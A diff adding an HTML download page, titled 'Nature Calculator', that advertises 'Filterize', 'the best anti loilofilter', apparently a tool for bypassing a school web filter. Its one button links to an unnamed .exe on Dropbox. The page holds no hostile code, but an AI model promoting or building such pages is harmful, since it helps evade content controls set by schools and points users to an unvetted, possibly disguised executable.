@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nature Calculator - Download</title>
+    <style>
+        /* 全体のレイアウト設定 */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        /* 背景画像の設定（背景.pngをぼかして表示） */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('背景.png') no-repeat center center/cover;
+            /* ぼかし(15px)と明るさ(60%)の調整 */
+            filter: blur(15px) brightness(0.6);
+            /* ぼかしの縁を隠すために少しだけ拡大 */
+            transform: scale(1.1);
+            z-index: -1;
+        }
+
+        /* コンテンツの中央配置 */
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: clamp(2rem, 8vw, 4rem);
+            margin-bottom: 0.2em;
+            font-weight: 500;
+        }
+
+        .description {
+            font-size: 1.1rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 3rem;
+        }
+
+        /* 画像に基づいたグラデーションボタン */
+        .btn {
+            display: inline-block;
+            padding: 18px 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: white;
+            text-decoration: none;
+            /* ピンクから紫へのグラデーション */
+            background: linear-gradient(135deg, #b399ff 0%, #ff99cc 100%);
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(179, 153, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(255, 153, 204, 0.5);
+            filter: brightness(1.1);
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="background"></div>
+
+    <div class="container">
+        <h1>Filterize</h1>
+        <p class="description">The best anti loilofilter</p>
+        
+        <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
+            Download Now
+        </a>
+    </div>
+
+</body>
+</html>
